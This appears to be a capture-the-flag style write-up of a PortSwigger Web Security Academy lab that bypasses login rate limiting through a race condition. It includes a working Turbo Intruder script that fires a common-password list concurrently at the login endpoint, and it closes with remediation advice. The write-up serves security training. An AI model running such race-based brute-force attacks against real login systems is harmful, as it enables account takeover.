# Race Conditions: Bypassing Rate Limits via Race Conditions

## Platform
PortSwigger Web Security Academy

## Difficulty
Practitioner

## Vulnerability Category
Race Conditions – Rate Limit Bypass

## Lab Objective
The objective was to exploit a race condition in the login mechanism to bypass brute-force protection and successfully identify the password for the user `carlos`.

The application implements rate limiting to prevent repeated login attempts. However, concurrent requests can exploit a timing flaw in how the application processes and tracks failed authentication attempts.

## Vulnerability Overview
Rate limiting is commonly implemented to restrict the number of authentication attempts within a specific time window.

However, if the application does not properly synchronize concurrent requests, multiple login attempts may be processed before the rate-limit counter is updated.

This creates a race condition.

By sending multiple authentication requests simultaneously, an attacker may bypass the intended rate limit and perform more password attempts than the application normally permits.

In this lab, Turbo Intruder was used to exploit this behavior by queuing multiple requests and releasing them together using a synchronization gate.

## Methodology

1. Inspected the login functionality and identified the authentication endpoint.
2. Captured the login request using Burp Suite Proxy.
3. Examined the application's rate-limiting behavior.
4. Sent multiple login attempts to observe response differences.
5. Used Burp Suite Turbo Intruder to automate concurrent requests.
6. Analyzed HTTP status codes and response characteristics to identify a successful authentication attempt.

## Exploitation Steps

### 1. Identify the Login Endpoint

The login functionality was observed sending authentication requests to:

`POST /login`

The application accepted username and password parameters and implemented rate limiting to defend against brute-force attacks.

### 2. Capture the Login Request

Intercepted the login request using Burp Suite Proxy and sent it to Turbo Intruder.

The captured request was used as the base request for automated password testing.

### 3. Configure Turbo Intruder

A password list was prepared and supplied to Turbo Intruder.

The attack used the `Engine.BURP2` engine with a single connection and synchronization gates.

The synchronization gate ensured that requests were queued before being released together.

### 4. Execute the Race Condition Attack

Turbo Intruder queued multiple authentication requests using:

`engine.queue(target.req, password, gate='1')`

Once the requests were queued, the gate was released using:

`engine.openGate('1')`

This caused the queued requests to be sent together, exploiting the race condition in the application's rate-limiting mechanism.

### 5. Analyze the Responses

The responses were compared using their HTTP status codes, response lengths, and other characteristics.

A successful authentication attempt produced an HTTP `302 Found` response with a redirect to:

`/my-account?id=carlos`

The successful password identified during testing was:

`121212`

This confirmed that the rate limit could be bypassed through concurrent authentication requests.

## Payloads

### Turbo Intruder Script

```python
def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    passwords = [
        "123123",
        "abc123",
        "football",
        "monkey",
        "letmein",
        "shadow",
        "master",
        "666666",
        "qwertyuiop",
        "123321",
        "mustang",
        "123456",
        "password",
        "12345678",
        "qwerty",
        "123456789",
        "12345",
        "1234",
        "111111",
        "1234567",
        "dragon",
        "1234567890",
        "michael",
        "x654321",
        "superman",
        "1qaz2wsx",
        "baseball",
        "7777777",
        "121212",
        "000000"
    ]

    for password in passwords:
        engine.queue(target.req, password, gate='1')

    engine.openGate('1')


def handleResponse(req, interesting):
    table.add(req)
```

**Note:** `target.req` represents the captured login request with the password insertion position configured in Turbo Intruder.

### Successful Response

```http
HTTP/2 302 Found
Location: /my-account?id=carlos
```

## Root Cause

The underlying issue was improper synchronization in the application's rate-limiting mechanism.

Concurrent authentication requests could be processed before the rate-limit state was consistently updated.

This allowed multiple password attempts to bypass the intended restriction.

The application failed to enforce rate limiting atomically across simultaneous requests.

## Remediation

- Implement atomic rate-limit counter updates.
- Ensure concurrent authentication requests cannot bypass rate limits.
- Apply rate limiting consistently across application instances.
- Introduce progressive delays and temporary account lockouts after repeated failed attempts.
- Monitor suspicious authentication patterns and concurrent login attempts.
- Consider additional protections such as MFA and risk-based authentication.

## References

- [PortSwigger Web Security Academy – Race Conditions](https://portswigger.net/web-security/race-conditions)
- [PortSwigger Research – Smashing the State Machine](https://portswigger.net/research/smashing-the-state-machine)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)